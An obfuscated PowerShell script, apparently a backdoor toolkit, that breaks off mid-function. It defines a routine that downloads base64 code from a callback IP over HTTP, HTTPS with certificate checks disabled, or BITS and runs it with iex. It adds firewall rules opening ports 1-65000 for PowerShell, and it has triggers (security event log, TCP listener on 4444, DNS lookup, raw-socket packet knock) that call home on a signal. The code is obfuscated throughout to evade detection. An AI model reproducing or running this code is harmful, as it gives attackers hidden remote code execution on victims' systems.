&("{1}{0}"-f't','sE') ("2jl"+"5p"+"6")  ([type]("{3}{4}{2}{7}{5}{1}{0}{6}"-f 'inTMANa','ePO','M.nEt.S','S','yStE','Ic','gER','Erv')  ) ;    &('SV')  ("1km"+"7")  ( [TYPE]("{0}{1}{2}" -F 'sYSTEM.','CONVe','RT') ) ;    &("{2}{1}{3}{0}"-f'abLE','vAr','SET-','i')  9Y16FJ  (  [TyPE]("{0}{4}{1}{3}{5}{2}"-f'sy','eM.tEx','diNG','t.eN','sT','Co') ) ;&("{1}{0}{3}{2}"-f 'ET-','s','E','VarIABl')  O15 ( [tYPE]("{0}{2}{3}{1}{4}" -F 's','EM','YS','T','.NEt.dnS')  ) ; &("{2}{0}{1}" -f '-i','Tem','SET')  ('Va'+'rIAbLe'+':ALvK')  ( [tYpE]("{3}{1}{2}{8}{4}{7}{6}{0}{5}"-F'siDEN','CURIty.','Pri','Se','a','TITY','iNDoW','l.w','nciP') )  ;  &('sV') LZmb  ([Type]("{0}{1}" -f 'rEgE','x') );   &("{1}{2}{0}" -f'iTEM','seT','-') vAriaBLe:i6YB  (  [tYpe]("{0}{3}{6}{5}{1}{2}{4}"-F 'NEt.','esS','f','sOCK','amILy','S.adDr','ET'))  ;  &("{1}{0}" -f'm','set-iTe')  variABLE:tDKZ  (  [TyPe]("{0}{2}{5}{3}{4}{1}" -F'NE','s.socKettyPE','t.S','kE','t','oc')  ); &("{0}{1}" -f 's','et')  ('g'+'a2') ([tyPe]("{3}{5}{0}{4}{2}{1}"-F'OCKETS.pRO','E','yp','NeT.','TOCOlT','s'))  ; &("{1}{0}"-f 't','Se')  ('h'+'nb')  ( [type]("{1}{2}{5}{0}{6}{4}{3}" -f 'tS.IOc','nE','t.','E','tRolCod','sOcke','On'))  ;  &('sv') 0b1O  (  [tYpE]("{2}{0}{6}{4}{5}{3}{7}{1}"-f'.S','agS','neT','Cke','.S','O','ocKEts','TFl')) ;   ${Z`j3}  =  [TypE]("{2}{0}{1}" -f'I','mE','dAtet') ;  







function INVOk`e`-`C`AllBAcK`ieX
{

	Param(
	[Parameter(mANDatory=${TR`Ue},POsiTIon=1)]
	[string]${C`ALl`BA`cKip},
	[Parameter(mAnDatorY=${F`A`lSE},posItiON=2)]
	[int]${meTh`OD}=0,
	[Parameter(MANdAtOrY=${F`AlSe},poSITion=3)]
	[string]${BIT`Ste`MpFilE}="$env:temp\ps_conf.cfg",
	[Parameter(MandaToRY=${F`ALse},PoSitiOn=4)]
	[string]${RE`SouRCE}=("{2}{3}{1}{0}"-f 'co','con.i','/fav','i'),
	[Parameter(maNdaTOry=${F`ALSe},poSItION=5)]
	[bool]${s`i`LenT}=${FA`lsE}
	)
	
	
	if(${cALL`B`A`Ckip})
	{
		try {
			
			if (${M`ETh`Od} -eq 0)
			{
				
				${u`RL}="http://$CallbackIP$resource"
				if(-not ${S`ilEnt}) {&("{0}{2}{1}" -f 'w','te-host','ri') ('Ca'+'llin'+'g '+'ho'+'me '+'w'+'ith '+'meth'+'od '+"$method "+'to'+': '+"$url")}
				
				${e`NC} = (&("{3}{1}{0}{2}"-f 'obje','ew-','ct','n') ("{3}{1}{0}{2}" -f 'clien','.web','t','net')).("{2}{0}{1}"-f 'strin','g','download').Invoke(${u`RL})
			}
			
			elseif (${m`ETHOD} -eq 1)
			{
				 (  &("{2}{0}{1}"-f'-vaRI','aBle','GeT') ("2JL"+"5p"+"6")  -Va  )::"sEr`VE`R`cerTifIcAte`VAliD`ATionCAL`lBACK" = {${t`RUE}}
				${U`Rl}="https://$CallbackIP$resource"
				if(-not ${s`IL`eNT}) {&("{0}{1}{2}"-f 'wr','ite-','host') ('C'+'allin'+'g '+'ho'+'me '+'wi'+'th '+'me'+'thod'+' '+"$method "+'to'+': '+"$url")}
				
				${e`Nc} = (&("{3}{2}{0}{1}" -f'j','ect','ob','new-') ("{3}{4}{0}{2}{1}" -f'bcl','nt','ie','n','et.we')).("{2}{0}{1}{3}"-f 'wn','loadstri','do','ng').Invoke(${u`Rl})
			}
			
			elseif (${mE`THod} -eq 2)
			{
				${u`Rl}="http://$CallbackIP$resource"
				if(-not ${s`i`leNt}) { &("{0}{2}{1}"-f'wr','-host','ite') ('Cal'+'ling'+' '+'ho'+'me '+'w'+'ith '+'met'+'h'+'od '+"$method "+'t'+'o: '+"$url")
				&("{3}{1}{0}{2}"-f'e-hos','t','t','wri') ('BITS'+' '+'Temp'+' '+'outp'+'ut '+'t'+'o: '+"$BitsTempFile")}
				&("{3}{0}{1}{2}" -f'-','Mo','dule','Import') ("{0}{2}{1}" -f'*','*','bits')
				&("{2}{3}{0}{1}{4}"-f '-BitsT','rans','S','tart','fer') ${u`Rl} ${BI`TsT`e`MP`FiLe} -ErrorAction ("{1}{0}"-f 'p','Sto')
				
				${E`NC} = &("{2}{1}{3}{0}"-f't','t-C','Ge','onten') ${bI`T`sT`empFIle} -ErrorAction ("{0}{1}" -f'S','top')
				
				
				&("{3}{2}{0}{1}"-f've-It','em','mo','Re') ${bITST`E`m`PfilE} -ErrorAction ("{1}{3}{0}{2}"-f't','Silent','inue','lyCon')
				
			}
			else 
			{
				if(-not ${S`ILE`NT}) { &("{0}{1}{2}"-f'write-','hos','t') ("{2}{9}{6}{4}{7}{8}{0}{5}{3}{1}"-f 'cal','d','E','etho','prop','lback m',': Im','e','r ','rror') -fore ("{1}{0}"-f'ed','r')}
				return 0
			}
			
			
			if (${e`Nc})
			{
				
				${B} =  (&("{3}{0}{1}{2}"-f 'AB','L','E','GeT-vaRi')  ("1KM"+"7") ).VAlUe::("{2}{3}{4}{1}{0}" -f'tring','S','Fr','omB','ase64').Invoke(${E`NC})
				${d`Ec} =  (&("{1}{0}" -f'r','dI') VarIable:9y16fj).vAluE::"u`Tf8"."GEts`TRiNG"(${B})
				
				
				&("{1}{0}"-f 'ex','i') ${D`ec}
			}
			else
			{
				if(-not ${SiLE`Nt}) { &("{1}{0}{2}"-f '-hos','write','t') ("{1}{4}{3}{0}{2}" -f'a Down','Error: ','loaded','t','No Da') -fore ("{0}{1}" -f'r','ed')}
				return 0
			}
		}
		catch [System.Net.WebException]{
			if(-not ${si`lenT}) { &("{1}{2}{0}"-f'te-host','wr','i') ("{3}{2}{4}{5}{1}{0}" -f'ailed','rk Callback f',':','Error',' Netw','o') -fore ("{0}{1}" -f 'r','ed')}
			return 0
		}
		catch [System.FormatException]{
			if(-not ${SI`l`ENt}) { &("{1}{0}{2}"-f'ite-','wr','host') ("{1}{6}{5}{4}{2}{3}{0}"-f 'at Problem','Err','For','m','64 ',': Base','or') -fore ("{1}{0}" -f 'ed','r')}
			return 0
		}
		catch [System.Exception]{
			if(-not ${sil`ENt}) { &("{0}{2}{1}" -f'write','host','-') ("{1}{5}{8}{2}{7}{4}{3}{0}{6}" -f'e','Er','b','transf','ring ','ror: Uk','r','lem du','nown pro') -fore ("{1}{0}" -f 'd','re')}
			
			return 0
		}
	}
	else
	{
		if(-not ${sIL`EnT}) { &("{1}{0}{2}"-f 'e-h','writ','ost') ((("{3}{1}{6}{5}{4}{2}{0}"-f'home :(','host s','e phone ','No ','or th','cified f','pe'))) -fore ("{0}{1}"-f 're','d')}
		return 0
	}
	
	return 1
}

function ad`d-PS`FiREW`ALlruL`eS
{

	Param(
	[Parameter(manDaTORY=${f`AlSe},PoSItiOn=1)]
	[string]${Ru`lE`NamE}=("{1}{2}{0}{3}" -f 'owers','Windows',' P','hell'),
	[Parameter(maNDAtORy=${F`Al`SE},PosITion=2)]
	[string]${E`XeP`ATH}=((("{14}{1}{7}{12}{15}{2}{10}{8}{5}{11}{0}{13}{4}{16}{9}{6}{3}"-f'dow','0}w','s{0','.exe','shell{','{0}','ell','i','tem32','powersh','}sys','win','nd','spower','C:{','ow','0}v1.0{0}'))-F  [CHaR]92),
	[Parameter(mandatorY=${F`AlSE},poSiTIoN=3)]
	[string]${po`R`TS}=("{2}{0}{1}" -f '65','000','1-')
	)

	If (-NOT ([Security.Principal.WindowsPrincipal]  ${Al`Vk}::("{0}{1}{2}{3}" -f'GetCu','rre','n','t').Invoke())."IS`IN`ROLe"([Security.Principal.WindowsBuiltInRole] ("{3}{0}{1}{2}"-f'dmin','i','strator','A')))
	{
		&("{0}{1}{2}" -f 'Writ','e-Hos','t') ((("{8}{9}{7}{3}{5}{0}{2}{12}{6}{4}{11}{1}{10}"-f 're','wo','s Admin :(.','and req','get t','ui','. ','m','Th','is com','rk! ','o ','.')))
		Return
	}
	
	
	${F`w} = &("{0}{2}{1}" -f'New-','ect','Obj') -ComObject ("{2}{1}{0}{3}"-f 'fwpoli','netcfg.','h','cy2')
	${r`UlE} = &("{0}{2}{1}"-f'Ne','ect','w-Obj') -ComObject ("{1}{0}{2}"-f'tCfg.FWR','HNe','ule')
	${Ru`le}."nA`mE" = ${Rulen`A`mE}
	${R`ULE}."AP`PLiC`ATiON`Name"=${exE`p`ATH}
	${Ru`LE}."P`R`OtOcol" = 6
	${R`ULE}."LOCALP`Or`Ts" = ${p`O`RtS}
	${R`ULe}."dIr`Ecti`On" = 2
	${ru`Le}."eN`Ab`lED"=${t`RuE}
	${Ru`LE}."G`Ro`UpInG"=("{3}{0}{1}{2}"-f'wallapi','.dll,-2','3255','@fire')
	${R`ULe}."Pr`oFIleS" = 7
	${RU`lE}."Ac`T`Ion"=1
	${rU`lE}."eDGetra`VE`RS`Al"=${FaL`sE}
	${f`w}."R`UlES".("{1}{0}"-f'dd','A').Invoke(${ru`Le})
	
	
	${R`UlE} = &("{1}{0}{2}" -f '-Objec','New','t') -ComObject ("{0}{3}{1}{4}{2}" -f'HNetC','.','WRule','fg','F')
	${r`ULE}."NA`ME" = ${r`ULe`NA`mE}
	${Ru`LE}."aPp`L`ICaTIONNa`Me"=${exE`P`Ath}
	${RU`Le}."pRO`To`CoL" = 17
	${r`ULe}."lOcAlP`o`RTS" = ${PO`R`Ts}
	${RU`LE}."di`RecTi`ON" = 2
	${Ru`Le}."Ena`B`LED"=${TR`Ue}
	${rU`le}."gR`oUP`ING"=("{1}{4}{6}{3}{0}{5}{2}"-f '3','@firewall','55','dll,-2','ap','2','i.')
	${R`UlE}."P`Ro`FILeS" = 7
	${R`ULe}."A`cTIon"=1
	${r`ULe}."E`D`gEtR`A`VERSAL"=${f`AlSe}
	${FW}."rU`lEs".("{1}{0}" -f 'd','Ad').Invoke(${ru`lE})
	
	
	${Ru`LE} = &("{2}{1}{0}" -f 't','ew-Objec','N') -ComObject ("{1}{2}{3}{0}"-f '.FWRule','HNet','C','fg')
	${ru`Le}."n`Ame" = ${R`Ulen`Ame}
	${R`Ule}."apPlIC`AT`i`O`NnAME"=${Ex`EPa`TH}
	${r`ULe}."Pr`oT`ocoL" = 6
	${Ru`Le}."L`ocALp`orTs" = ${p`OrTs}
	${R`ULe}."diR`eCT`ioN" = 1
	${r`ULe}."ENa`BLed"=${t`RuE}
	${r`UlE}."grouPi`Ng"=("{2}{1}{3}{0}{4}{5}"-f'dll','allap','@firew','i.',',-2','3255')
	${r`ULE}."ProF`il`eS" = 7
	${Ru`Le}."a`Ct`Ion"=1
	${Ru`lE}."E`Dg`etRAVe`RsAL"=${F`AlSe}
	${F`W}."rul`eS".("{1}{0}"-f'dd','A').Invoke(${R`Ule})
	
	
	${R`UlE} = &("{2}{0}{1}" -f 'bjec','t','New-O') -ComObject ("{0}{3}{1}{2}" -f 'HN','g.F','WRule','etCf')
	${R`ULe}."N`AmE" = ${r`ULe`NAmE}
	${R`Ule}."ApP`l`IcAtio`N`NamE"=${Exe`pa`Th}
	${r`UlE}."PRO`TOCOL" = 17
	${R`ULe}."LOCAL`po`RTs" = ${pO`R`Ts}
	${RU`le}."DiRE`CtI`On" = 1
	${R`Ule}."enA`BLED"=${Tr`Ue}
	${RU`LE}."gRou`pInG"=("{0}{2}{3}{1}{4}" -f'@fir','pi','ewa','lla','.dll,-23255')
	${ru`lE}."pRO`FiLEs" = 7
	${RU`lE}."A`CtIoN"=1
	${R`ULe}."EDg`EtraVe`RsAl"=${faL`SE}
	${F`w}."RuL`Es".("{1}{0}" -f'd','Ad').Invoke(${R`ULe})

}

function i`NV`okE-eVEnt`l`Oop
{

	Param(
	[Parameter(mAnDaTORY=${t`RuE},positiON=1)]
	[string]${C`ALlB`ACkIP},
	[Parameter(MAndAtoRY=${f`ALSe},PositIOn=2)]	
	[string]${t`R`igger}=("{1}{0}" -f'B','SIXDU'), 
	[Parameter(maNdatoRY=${F`AL`se},posiTIoN=3)]
	[int]${tImeO`UT}=0,
	[Parameter(mANDAtORY=${FAL`SE},poSiTIOn=4)]
	[int] ${Sl`EEp}=1
	)

	If (-NOT ([Security.Principal.WindowsPrincipal]   ${A`LVk}::("{2}{1}{0}"-f'tCurrent','e','G').Invoke())."is`i`NrOLE"([Security.Principal.WindowsBuiltInRole] ("{3}{2}{1}{0}"-f 'trator','s','ini','Adm')))
	{
		&("{1}{0}{2}" -f 'e-','Writ','Host') ((("{11}{2}{10}{1}{6}{7}{5}{4}{8}{0}{3}{9}"-f 'in ',' b','hi',':(... get to','res Ad','i','ackdoo','r requ','m',' work! ','s','T')))
		Return
	}
	
	&("{0}{2}{1}" -f 'writ','ost','e-h') ('Timeout'+': '+"$Timeout")
	&("{2}{0}{3}{1}" -f'i','st','wr','te-ho') ('Tri'+'gger'+': '+"$Trigger")
	&("{2}{0}{1}{3}"-f'te-h','o','wri','st') ('Cal'+'lbac'+'kI'+'P: '+"$CallbackIP")
	&("{2}{1}{3}{0}" -f'st','te','wri','-ho')
	&("{2}{0}{1}" -f'ho','st','write-') ("{5}{3}{1}{2}{4}{0}"-f 'oor...','ng bac','k','tarti','d','S')
	
	
	${Run`Ni`Ng}=${T`Rue}
	${M`AtCh} =""
	${sta`R`TTiME} = &("{0}{1}"-f'get','-date')
	while(${RUN`N`InG})
	{
		
		if (${TIme`O`Ut} -ne 0 -and ($(  (  &("{1}{0}" -f'ble','VaRia') Zj3  -VA  )::"n`Ow") -gt ${sTar`TTi`mE}.("{2}{1}{0}{3}" -f'e','ds','ad','conds').Invoke(${tIMeo`Ut})))  
		{
			${r`U`NNIng}=${Fal`SE}
		}
		
		${D} = &("{0}{1}{2}"-f'Ge','t-','Date')
		${NE`WEVeN`Ts} = &("{2}{1}{0}"-f'WinEvent','-','Get') -FilterHashtable @{("{0}{1}" -f'log','name')=("{2}{1}{0}" -f'y','urit','Sec'); ("{0}{3}{1}{2}" -f'St','i','me','artT')=${d}.("{0}{2}{1}" -f 'Ad','econds','dS').Invoke(-${SL`e`EP})} -ErrorAction ("{3}{4}{2}{1}{0}"-f'e','u','tin','Silen','tlyCon') | &('fl') ("{1}{2}{0}" -f'sage','M','es') | &("{2}{0}{1}" -f '-Stri','ng','Out')
		
		
		if (${nEwEV`e`N`Ts} -match ${tR`iGg`eR})
		{
				${R`Un`NiNG}=${fal`se}
				${mAT`CH} = ${CalLba`cK`iP}
				&("{3}{0}{2}{1}"-f 'ite','t','-hos','wr') ('Ma'+'t'+'ch: '+"$match")
		}
		&("{1}{0}"-f'ep','sle') -s ${S`LE`eP}
	}
	if(${m`Atch})
	{
		${Su`Cce`sS} = &("{5}{0}{3}{2}{1}{4}"-f '-','ackIE','lb','Cal','X','Invoke') ${maT`ch}
	}
}

function I`NvOKe`-`pOrtbI`Nd
{

	Param(
	[Parameter(maNDAToRY=${f`AL`Se},pOSiTIOn=1)]
	[string]${cal`lBa`CK`Ip},
	[Parameter(mANdatOrY=${Fal`Se},PosITiOn=2)]
	[string]${loCa`lip}, 
	[Parameter(MANDaToRY=${fA`L`sE},poSItion=3)]
	[int]${P`oRt}=4444, 
	[Parameter(manDaTorY=${fAl`sE},poSITION=4)]
	[string]${T`R`iggeR}=("{2}{1}{0}" -f'123','ZWSX','QA'), 
	[Parameter(ManDATORy=${F`ALSE},posiTIoN=5)]
	[int]${TI`M`eOut}=0
	)
	
	
	if (-not ${lo`cAL`Ip}) 
	{
		&("{0}{1}" -f'rou','te') ("{0}{1}" -f'prin','t') ('0*') | &('%') { 
			if (${_} -match "\s{2,}0\.0\.0\.0") { 
				${n`UlL},${nu`LL},${N`Ull},${loC`Al`ip},${NU`LL} =   ( &("{1}{0}" -f'R','DI') VarIaBlE:LZMB  ).VALUe::("{0}{1}" -f 'repla','ce').Invoke(${_}.("{1}{0}"-f 'mstart','tri').Invoke(" "),"\s{2,}",",").("{1}{0}"-f 'lit','sp').Invoke(",")
				}
			}
	}
	
	
	&("{2}{0}{1}" -f'te-hos','t','wri') ("{2}{7}{0}{4}{1}{6}{8}{3}{5}{9}" -f'KD','UIRES F','!!! THI','AL','OOR REQ','L ','IRE','S BAC','W','EXCEPTION !!!')
	&("{1}{2}{0}"-f't','write-ho','s') ('T'+'ime'+'out: '+"$Timeout")
	&("{0}{2}{1}"-f 'write','ost','-h') ('P'+'ort: '+"$Port")
	&("{2}{0}{1}" -f'te-','host','wri') ('T'+'r'+'igger: '+"$Trigger")
	&("{0}{1}{2}"-f 'writ','e-ho','st') ('Usi'+'ng '+'IPv'+'4 '+'Addre'+'s'+'s: '+"$LocalIP")
	&("{0}{1}{2}" -f'wr','it','e-host') ('Callbac'+'kIP'+': '+"$CallbackIP")
	&("{0}{1}{3}{2}"-f 'write','-h','st','o')
	&("{0}{1}{3}{2}"-f 'write','-','st','ho') ("{0}{3}{1}{2}"-f 'St',' ba','ckdoor...','arting')
	try{
		
		
		${ip`ENd`poinT} = &("{1}{0}{2}" -f'w-objec','ne','t') ("{3}{6}{0}{2}{4}{5}{1}"-f'em.net.ip','nt','en','sys','d','poi','t')([net.ipaddress]"$localIP",${P`ort})
		${lis`T`ENeR} = &("{2}{1}{0}" -f'ject','w-ob','ne') ("{3}{2}{5}{1}{0}{4}{6}"-f'T','.Sockets.','em.Ne','Syst','cp','t','Listener') ${I`P`ENDpOINt}
		${l`ISTEn`Er}.("{1}{0}"-f 'rt','Sta').Invoke()
		
		
		${RUnn`i`NG}=${T`RuE}
		${MAt`CH} =""
		${stAr`T`T`iMe} = &("{0}{1}{2}"-f'get-d','at','e')
		while(${rUNN`Ing})
		{			
			
			if (${ti`m`eOuT} -ne 0 -and ($( ( &("{2}{0}{1}{3}"-f 'l','d','gET-chi','ITEM') VARiaBlE:zj3).VALUe::"N`Ow") -gt ${StA`RTT`imE}.("{2}{0}{1}{3}"-f'dsec','o','ad','nds').Invoke(${tIm`EO`UT})))  
			{
				${R`Un`Ning}=${fAL`sE}
			}
			
			
			if(${LiS`TeN`Er}.("{0}{1}" -f'P','ending').Invoke())
			{
				
				${C`L`IeNT} = ${Li`ste`NEr}.("{3}{0}{2}{1}"-f't','lient','TcpC','Accep').Invoke()
				&("{2}{1}{0}"-f't','te-hos','wri') ("{2}{0}{4}{3}{1}{5}"-f 'lie','c','C',' Conne','nt','ted!')
				${s`TrE`AM} = ${C`LI`ENT}.("{1}{0}{2}"-f 'tStr','Ge','eam').Invoke()
				${ReAd`er} = &("{2}{1}{0}" -f'object','ew-','n') ("{4}{0}{1}{3}{2}" -f 'tem.IO.Strea','mRe','der','a','Sys') ${S`TrEam}
				
				
				${L`iNE} = ${ReAd`ER}.("{0}{2}{1}"-f 'R','dLine','ea').Invoke()
				
				
				if (${l`INe} -eq ${tR`IGG`er})
				{
					${rU`N`NiNg}=${FA`LSE}
					${m`A`TCh} = ([system.net.ipendpoint] ${c`l`IEnT}."cliE`Nt"."RE`MotEe`N`DpOInT")."AD`d`RESS".("{0}{1}{2}"-f 'ToS','t','ring').Invoke()
					&("{0}{1}{2}"-f 'wr','ite-h','ost') ('M'+'ATCH: '+"$match")
				}
				
				
				${Read`ER}.("{1}{0}" -f 'e','Dispos').Invoke()
				${S`Tre`AM}.("{1}{0}"-f'ispose','D').Invoke()
				${Cl`ieNT}.("{0}{1}"-f 'Cl','ose').Invoke()
				&("{2}{1}{0}" -f'st','rite-ho','w') ("{2}{1}{0}{3}{4}"-f ' Dis','ent','Cli','conn','ected')
			}
		}
		
		
		&("{0}{1}{2}"-f 'wri','te-hos','t') ("{2}{3}{1}{0}"-f'ocket','ing S','St','opp')
		${Li`StE`NEr}.("{0}{1}" -f 'St','op').Invoke()
		if(${MA`Tch})
		{
			if(${C`ALLBACK`ip})
			{
				${S`Ucce`Ss} = &("{3}{1}{2}{0}"-f'X','llbackI','E','Invoke-Ca') ${calLB`AC`kip}
			}
			else
			{
				${SUC`c`esS} = &("{1}{3}{0}{2}" -f'allback','Invo','IEX','ke-C') ${ma`T`ch}
			}
		}
	}
	catch [System.Net.Sockets.SocketException] {
		&("{2}{0}{1}" -f 'rite','-host','w') ("{6}{1}{3}{2}{0}{5}{4}"-f 'r','r: So','Er','cket ','r','o','Erro') -fore ("{0}{1}" -f 're','d')
	}
}

function I`NVO`k`E-DNs`lOoP
{

	param(
		[Parameter(MaNdAtOry=${F`ALsE},POsiTion=1)]
		[string]${c`AlLBAcK`IP},
		[Parameter(MaNDAtOrY=${f`A`lSE},PosITiOn=2)]
		[string]${Ho`StNa`me}=("{1}{0}{2}"-f 'ay.si','y','xdub.net'),
		[Parameter(mandAtorY=${FA`LSE},pOsiTion=3)]
		[string]${t`Ri`Gger}=("{1}{0}{2}" -f '7.0','12','.0.1'),
		[Parameter(maNdATORy=${FAL`se},POsitiOn=4)]
		[int] ${Ti`m`Eout}=0,
		[Parameter(mANDATORy=${FA`L`sE},posItioN=5)]
		[int] ${S`l`eeP}=1
	)
	
	
	&("{1}{0}{2}" -f '-','write','host') ('T'+'imeout'+': '+"$Timeout")
	&("{2}{1}{0}"-f'host','-','write') ('Sle'+'ep '+'Ti'+'me: '+"$Sleep")
	&("{2}{0}{1}" -f'te-','host','wri') ('Trigge'+'r:'+' '+"$Trigger")
	&("{3}{2}{0}{1}"-f 'te','-host','ri','w') ('Usi'+'ng '+'Hostnam'+'e'+':'+' '+"$Hostname")
	&("{0}{1}{2}" -f 'wri','te-','host') ('Callback'+'IP'+': '+"$CallbackIP")
	&("{2}{0}{1}"-f 'ho','st','write-')
	&("{2}{1}{0}" -f'st','o','write-h') ("{4}{2}{1}{3}{0}"-f'...','kd','ac','oor','Starting b')
	
	
	${r`U`NNiNg}=${tr`UE}
	${ma`TCH} =""
	${ST`A`RTtime} = &("{1}{0}"-f'te','get-da')
	while(${r`UNnI`Ng})
	{
		
		if (${T`ImEO`UT} -ne 0 -and ($(  ( &("{1}{0}"-f'eM','It') VaRiABlE:ZJ3  ).Value::"n`OW") -gt ${S`TArt`TIme}.("{1}{0}{2}" -f 'dd','a','seconds').Invoke(${tI`meO`UT})))  
		{
			${runN`ing}=${F`A`LSe}
		}
		
		try {
			
			${i`ps} =  (  &("{3}{0}{1}{2}"-f'l','DIT','Em','cHI')  VAriABLe:o15 ).VaLUE::("{1}{0}{2}"-f's','GetHo','tAddresses').Invoke(${HOsT`N`AmE})
			foreach (${ad`dr} in ${i`PS})
			{
				
				
				${r`esOlv`ED}=${aD`Dr}."i`paddr`eSS`ToSt`R`ING"
				if(${RE`SOL`V`ED} -ne ${TR`iG`gER})
				{
					${r`Unni`Ng}=${Fa`L`SE}
					${mAT`Ch}=${r`eSoLv`ed}
					&("{2}{0}{1}" -f'te-ho','st','wri') ('Mat'+'ch: '+"$match")
				}
				
			}
		}
		catch [System.Net.Sockets.SocketException]{
			
		}

		&("{0}{1}"-f 'sl','eep') -s ${S`L`eeP}
	}
	&("{1}{0}{2}" -f '-h','write','ost') ("{6}{0}{7}{1}{3}{4}{5}{2}"-f'ng down','N','..','S ','Che','ck.','Shutti',' D')
	if(${MA`T`ch})
	{
		if(${cAL`LBaC`kIP})
		{
			${SuCcE`ss} = &("{3}{4}{0}{1}{2}"-f'voke-C','allback','IEX','I','n') ${caLL`B`ACK`IP}
		}
		else
		{
			${Suc`c`eSs} = &("{3}{2}{1}{0}"-f'llbackIEX','ke-Ca','vo','In') ${m`AtcH}
		}
	}
}

function iNVokE-`P`Ac`kE`TKnO`cK
{	

	param(
	[Parameter(manDatoRy=${f`AL`se},PositioN=1)]
	[string]${CAL`LbAcK`iP},
	[Parameter(mANdAtory=${F`ALSE},PoSiTioN=2)]
	[string]${lO`CalIP}, 
	[Parameter(MAnDatOrY=${F`A`lsE},POsITion=3)]
	[string]${TR`Ig`Ger}=("{0}{2}{1}" -f'Q','SX123','AZW'), 
	[Parameter(mandATORY=${FA`LSE},POsitiON=4)]
	[int]${TimE`O`UT}=0
	)
	If (-NOT ([Security.Principal.WindowsPrincipal]   ( &("{1}{0}{2}"-f'ia','Get-vAR','Ble')  ("Al"+"Vk")).VaLUe::("{3}{1}{2}{0}" -f'nt','et','Curre','G').Invoke())."IS`INRoLE"([Security.Principal.WindowsBuiltInRole] ("{3}{0}{2}{1}" -f 'tr','r','ato','Adminis')))
	{
		&("{1}{2}{0}"-f'Host','Writ','e-') ((("{0}{5}{10}{8}{9}{1}{2}{6}{7}{4}{3}" -f 'This backdoo','n ',':','! ',' work','r re','(.','.. get to','ires Ad','mi','qu')))
		Return
	}
	
	if (-not ${L`oCalIP}) 
	{
		&("{0}{1}"-f'rout','e') ("{1}{0}" -f 't','prin') ('0*') | &('%') { 
			if (${_} -match "\s{2,}0\.0\.0\.0") { 
				${nU`Ll},${Nu`ll},${nU`LL},${lOCAl`ip},${Nu`LL} =  (&("{3}{2}{0}{1}"-f'ariABl','E','t-v','ge')  lzmB -vAlU)::("{2}{0}{1}" -f'lac','e','rep').Invoke(${_}.("{2}{0}{1}" -f'ta','rt','trims').Invoke(" "),"\s{2,}",",").("{0}{1}"-f's','plit').Invoke(",")
				}
			}
	}
	
	
	&("{1}{2}{3}{0}" -f 'ost','writ','e-','h') ("{5}{2}{12}{13}{14}{4}{8}{9}{10}{0}{11}{1}{3}{6}{7}" -f 'CE','IO','!! THIS BACKDOOR RE','N','EWA','!',' !!','!','L','L',' EX','PT','Q','UIR','ES FIR')
	&("{0}{1}{2}"-f 'write-','h','ost') ('Time'+'o'+'u'+'t: '+"$Timeout")
	&("{3}{2}{0}{1}" -f'ite','-host','r','w') ('Tri'+'gger'+': '+"$Trigger")
	&("{1}{0}{2}" -f 's','write-ho','t') ('Usi'+'n'+'g '+'IPv4'+' '+'Ad'+'dre'+'ss: '+"$LocalIP")
	&("{0}{2}{1}"-f 'wr','-host','ite') ('C'+'all'+'backIP:'+' '+"$CallbackIP")
	&("{2}{3}{0}{1}"-f '-hos','t','wri','te')
	&("{0}{2}{1}{3}" -f 'write','os','-h','t') ("{3}{2}{5}{0}{4}{1}"-f'n','ckdoor...','t','Star','g ba','i')
	
	
	${by`TE`In} = &("{0}{1}{2}"-f'new-ob','j','ect') ("{1}{0}" -f 'yte[]','b') 4
	${B`yteo`UT} = &("{2}{0}{1}" -f'je','ct','new-ob') ("{1}{0}" -f ']','byte[') 4
	${BY`TeD`ATa} = &("{3}{0}{1}{2}"-f '-ob','j','ect','new') ("{0}{1}"-f'byt','e[]') 4096  

	${BYT`E`In}[0] = 1  
	${BYT`EIN}[1-3] = 0
	${bY`T`eOuT}[0-3] = 0
	
	
	${S`ock`Et} = &("{2}{3}{1}{0}"-f't','objec','n','ew-') ("{1}{0}{5}{2}{4}{3}" -f 'tem.','sys','.socke','et','ts.sock','net')(  (  &("{1}{0}" -f 'R','di')  VArIabLE:I6YB).vALUE::"iN`TeRNEt`wORk", ${t`dKZ}::"R`Aw", (&("{3}{2}{1}{0}" -f'AbLe','i','AR','GEt-V') ('G'+'a2')).vaLuE::"I`P")
	${So`Ck`ET}.("{0}{1}{3}{2}"-f 'setsocke','to','on','pti').Invoke("IP",("{1}{2}{3}{0}" -f'ed','He','ade','rInclud'),${T`RUe})
	${sO`cKEt}."Re`c`Eivebu`FferSI`ze" = 819200

	
	${Ip`E`NDp`oint} = &("{1}{3}{2}{0}" -f 't','n','bjec','ew-o') ("{1}{3}{0}{4}{5}{2}" -f 'ip','system.net','int','.','e','ndpo')([net.ipaddress]"$localIP",0)
	${SO`CKEt}.("{1}{0}"-f 'd','bin').Invoke(${IpE`N`DPo`iNt})

	
	[void]${s`oc`KEt}."ioCon`T`Rol"( (  &("{0}{2}{1}" -f 'VAR','ABLE','I') ('h'+'Nb') -vaL )::"RE`C`eivEAll",${BY`TEiN},${b`YtEO`UT})

	
	${START`TI`ME} = &("{1}{0}{2}" -f'et-d','g','ate')
	${R`UnN`iNG} = ${Tr`UE}
	${M`At`Ch} = ""
	${paC`K`ETS} = @()
	while (${R`Un`NiNG})
	{
		
		if (${tiM`e`out} -ne 0 -and ($(  ${z`J3}::"N`ow") -gt ${sta`RT`TImE}.("{0}{1}{2}"-f'ad','d','seconds').Invoke(${T`iME`OuT})))  
		{
			${RUn`N`INg}=${f`Alse}
		}
		
		if (-not ${S`o`CkeT}."av`AiLA`BLE")
		{
			&("{2}{3}{1}{0}" -f 'p','t-slee','st','ar') -milliseconds 500
			continue
		}
		
		
		${R`cv} = ${So`c`Ket}."RE`c`eIVe"(${bYtE`d`ATA},0,${bYt`e`DaTA}."lEN`GTH",  ( &("{0}{1}" -f'iT','em')  vARIabLe:0b1O).VAlue::"No`Ne")

		
		${mEM`ORyst`R`E`Am} = &("{0}{1}{2}"-f'new-o','b','ject') ("{0}{6}{3}{1}{4}{2}{5}" -f'Sys','O','orySt','m.I','.Mem','ream','te')(${bY`TeD`AtA},0,${R`Cv})
		${bIN`ARY`ReA`dER} = &("{0}{1}{2}" -f 'ne','w','-object') ("{0}{3}{6}{5}{2}{1}{4}"-f'Syst','ryRead','a','em','er','IO.Bin','.')(${mEMORYstR`E`Am})
		
		
		${t`R`ASH}  = ${bin`A`RY`ReaDER}.("{0}{1}{2}"-f 'ReadB','yt','es').Invoke(12)
		
		
